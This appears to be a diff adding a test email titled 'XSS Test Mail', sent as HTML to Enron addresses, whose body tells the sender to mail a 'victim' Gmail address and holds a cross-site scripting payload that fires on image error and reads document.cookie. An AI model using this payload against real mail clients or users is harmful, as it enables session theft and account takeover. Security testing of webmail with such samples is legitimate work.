@@ -1,0 +1,7 @@
+From: "Jeffrey Miller" <jeffmiller@alphapoint05.net>
+To: jennifer.burns@enron.com, mike.mcconnell@enron.com, torrey.moorer@enron.com, 
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+Send an email to the victim GMail address with the From field.<img src=# onerror=alert(document.cookie)>.
